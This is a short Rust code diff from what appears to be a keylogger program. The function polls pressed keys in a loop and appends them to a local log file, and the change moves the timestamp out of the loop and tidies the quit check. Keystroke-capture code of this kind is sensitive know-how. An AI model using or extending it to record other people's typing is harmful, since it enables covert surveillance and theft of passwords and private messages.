@@ -59,21 +59,23 @@ pub fn run(path: String, key_logger_data: Arc<Mutex<Keylogger>>)
         .open(path)
         .expect("Failed to open file");
 
+    let local: DateTime<Local> = Local::now();
+
+    writeln!(file, "[{:?}]", local.format("%Y-%m-%d %H:%M:%S").to_string()).expect("Failed to write to a file");
+
     loop 
     {
-        let local: DateTime<Local> = Local::now();
-
         let keys = device_state.get_keys();
         
         if keys != prev_keys && !keys.is_empty() 
         {
-            writeln!(file, "[{:?}] [Keyboard] {:?}", local.format("%Y-%m-%d %H:%M:%S").to_string(), keys).expect("Failed to write to a file");
+            write!(file, "{:?}", keys).expect("Failed to write to a file");
         }
         
         prev_keys = keys;
 
-        let val = key_logger_data.lock().unwrap().quit;
-        if val
+        let val = key_logger_data.lock().unwrap();
+        if val.quit
         {
             break;
         }
